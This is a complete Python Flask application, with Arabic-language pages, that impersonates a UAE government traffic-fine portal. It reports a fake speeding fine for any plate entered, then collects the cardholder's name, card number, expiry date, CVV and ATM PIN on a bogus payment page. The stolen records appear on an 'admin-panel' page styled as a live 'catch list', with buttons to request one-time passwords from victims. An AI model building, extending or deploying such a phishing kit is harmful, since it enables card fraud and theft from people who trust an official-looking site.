import os
from flask import Flask, render_template_string, request, redirect, url_for

app = Flask(__name__)

# مخزن البيانات في الذاكرة (الجديد أولاً)
captured_data = []

# --- 1. واجهة الموقع الرئيسية (الهيدر الثابت والأزرار) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الخدمات الرقمية - الإمارات</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; background-color: #ffffff; font-family: sans-serif; }
        .fixed-header { position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; background: white; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .fixed-header img { width: 100%; height: auto; display: block; }
        .content { margin-top: 150px; position: relative; z-index: 1; }
        .content img { width: 100%; height: auto; display: block; border: none; }
        .overlay-btn { position: absolute; background: rgba(0,0,0,0); border: none; cursor: pointer; width: 80%; height: 60px; left: 10%; transition: 0.3s; }
        .overlay-btn:active { background: rgba(0,0,0,0.05); }
    </style>
</head>
<body>
    <div class="fixed-header">
        <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
    </div>
    <div class="content">
        <img src="https://static.wixstatic.com/media/a9f3d9_60aea158216544beaf9ee02cb9bd8bc2~mv2.jpg">
        <button class="overlay-btn" style="top: 10%;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة استعلام المخالفات المرورية ---
SEARCH_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <style>
        body { background: #f4f4f4; font-family: sans-serif; margin: 0; padding-top: 160px; }
        .fixed-header { position: fixed; top: 0; width: 100%; z-index: 1000; background: white; }
        .fixed-header img { width: 100%; display: block; }
        .main-card { background: white; max-width: 600px; margin: 20px auto; border-radius: 12px; shadow: 0 4px 15px rgba(0,0,0,0.1); border: 1px solid #ddd; overflow: hidden; }
        .card-title { background-color: #b0914f; color: white; padding: 20px; text-align: center; font-size: 20px; font-weight: bold; }
        .content { padding: 30px; }
        .form-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-weight: 600; }
        select, input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .plate-grid { display: grid; grid-template-columns: 1fr 1fr 2fr; gap: 10px; }
        .btn-search { background-color: #b0914f; color: white; border: none; padding: 18px; border-radius: 4px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="fixed-header">
        <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
    </div>
    <div class="main-card">
        <div class="card-title">نظام الاستعلام عن المخالفات المرورية</div>
        <div class="content">
            <form action="/result" method="post">
                <div class="form-group"><label>الإمارة:</label><select><option>أبوظبي</option><option>دبي</option></select></div>
                <div class="form-group">
                    <label>بيانات اللوحة:</label>
                    <div class="plate-grid"><select><option>خصوصي</option></select><input type="text" placeholder="الرمز"><input type="number" placeholder="رقم اللوحة"></div>
                </div>
                <button type="submit" class="btn-search">بحث عن المخالفات</button>
            </form>
        </div>
    </div>
</body>
</html>
"""

# --- 3. صفحة نتيجة المخالفة (التمويه) ---
RESULT_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background: #f4f4f4; font-family: sans-serif; text-align: center; padding: 50px; }
    .card { background: white; max-width: 450px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-top: 5px solid #d32f2f; }
    .pay-btn { background: #b0914f; color: white; padding: 15px 30px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block; margin-top: 20px; }
</style></head>
<body>
    <div class="card">
        <h2 style="color:#d32f2f;">تم العثور على مخالفات!</h2>
        <p>إجمالي الغرامات المستحقة: <b>255.00 AED</b></p>
        <p>نوع المخالفة: تجاوز السرعة المقررة</p>
        <a href="/checkout" class="pay-btn">المتابعة للدفع الآمن</a>
    </div>
</body>
</html>
"""

# --- 4. صفحة الدفع الذهبية (الاحترافية) ---
CHECKOUT_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; padding-top: 40px; }
    .pay-box { background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 8px solid #b0914f; }
    input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
    .btn { background: #b0914f; color: white; width: 100%; padding: 16px; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
</style></head>
<body>
    <div class="pay-box">
        <h3 style="text-align:center;">بوابة الدفع الرقمية</h3>
        <p style="text-align:center;">المبلغ: <b>255.00 درهم</b></p>
        <form action="/capture" method="post">
            <input type="text" name="n" placeholder="الاسم على البطاقة" required>
            <input type="text" name="c" placeholder="رقم البطاقة (16 رقم)" maxlength="16" required>
            <div style="display:flex; gap:10px;"><input type="text" name="e" placeholder="MM/YY" required><input type="text" name="v" placeholder="CVV" required></div>
            <input type="password" name="p" placeholder="رقم ATM PIN السري" maxlength="4" required>
            <button type="submit" class="btn">تأكيد الدفع</button>
        </form>
    </div>
</body>
</html>
"""

# --- 5. لوحة التحكم الاحترافية (ADMIN PANEL) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><title>لوحة القناص الملكية</title>
    <style>
        body { background: #0f172a; color: white; font-family: sans-serif; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        .card-ui { background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #334155; border-radius: 15px; padding: 20px; position: relative; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
        .card-chip { width: 40px; height: 30px; background: #94a3b8; border-radius: 5px; margin-bottom: 20px; }
        .card-number { font-size: 20px; letter-spacing: 3px; font-family: 'Courier New', monospace; color: #38bdf8; margin-bottom: 15px; }
        .card-details { display: flex; justify-content: space-between; font-size: 14px; color: #94a3b8; }
        .otp-section { background: #334155; padding: 10px; margin-top: 15px; border-radius: 8px; border: 1px dashed #f59e0b; color: #f59e0b; font-weight: bold; text-align: center; }
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        .btn { flex: 1; padding: 10px; border-radius: 6px; border: none; cursor: pointer; color: white; font-weight: bold; text-align: center; text-decoration: none; }
        .accept { background: #22c55e; } .reject { background: #ef4444; }
    </style>
</head>
<body>
    <h1>قائمة الصيد المباشر 🎣 <small style="font-size:12px; color:#64748b;">(تحديث تلقائي - الجديد أولاً)</small></h1>
    <div class="grid">
        {% for item in data %}
        <div class="card-ui">
            <div class="card-chip"></div>
            <div class="card-number">{{ item.c[0:4] }} {{ item.c[4:8] }} {{ item.c[8:12] }} {{ item.c[12:16] }}</div>
            <div class="card-details">
                <div><span>حامل البطاقة:</span><br><b>{{ item.n }}</b></div>
                <div><span>التاريخ:</span><br><b>{{ item.e }}</b></div>
                <div><span>CVV:</span><br><b>{{ item.v }}</b></div>
            </div>
            <div class="otp-section">ATM PIN: {{ item.p }} | OTP: <span style="color:#fff">انتظار...</span></div>
            <div class="btn-group">
                <a href="#" class="btn accept">قبول (طلب OTP)</a>
                <a href="#" class="btn reject">رفض (بيانات خطأ)</a>
            </div>
        </div>
        {% endfor %}
    </div>
</body>
</html>
"""

# --- المسارات (Backend Logic) ---

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/result', methods=['POST'])
def result(): return render_template_string(RESULT_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(CHECKOUT_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    # إدخال البيانات في أول القائمة
    captured_data.insert(0, request.form.to_dict())
    return "<h2>جاري التحقق من البنك...</h2><p>يرجى الانتظار، سيصلك رمز التحقق (OTP) خلال لحظات.</p>"

@app.route('/admin-panel')
def admin(): return render_template_string(ADMIN_HTML, data=captured_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
